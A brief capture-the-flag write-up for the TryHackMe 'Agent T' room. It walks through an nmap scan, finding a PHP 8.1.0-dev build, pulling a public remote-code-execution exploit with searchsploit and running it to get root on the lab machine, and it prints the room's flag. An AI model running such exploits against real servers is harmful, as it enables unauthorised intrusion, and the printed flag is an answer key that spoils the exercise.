# [Agent T](https://tryhackme.com/room/agentt)

> Something seems a little off with the server.

## Scanning

scan the target

```
nmap -sS -sV -sC 10.10.151.122
```

![image](https://user-images.githubusercontent.com/90561566/212789516-7e6856e5-a97f-4f94-b9ba-8e9d66122423.png)

## HTTP

go to the webpage

![image](https://user-images.githubusercontent.com/90561566/212789709-004e2e84-376c-4ed6-b356-8a84e041d025.png)

we found a admin dardboard that contain a searchbar

## Enumeration

just try a request, i found the version of php

![image](https://user-images.githubusercontent.com/90561566/212789919-c64048e0-a715-4fd9-ac34-888da01d0d76.png)

quick search for cve

```
searchsploit php 8.1.0-dev
```

![image](https://user-images.githubusercontent.com/90561566/212790271-2c9a022a-50d6-456b-90bb-311c1bbb8fb6.png)

## Exploitation

```
searchsploit -m 49933.py
python3 49933.py
```

![image](https://user-images.githubusercontent.com/90561566/212790541-dc03c007-0b5b-4b06-b2fd-8f188858c147.png)

wow amazing, we got root user

```
find / -name *flag*.txt 2>/dev/null
```

![image](https://user-images.githubusercontent.com/90561566/212790782-4676cfc0-c4c7-41de-94c3-54b76bf9335a.png)

| Flag | user.txt |
| --- | --- |
| Answer | flag{4127d0530abf16d6d23973e3df8dbecb} |
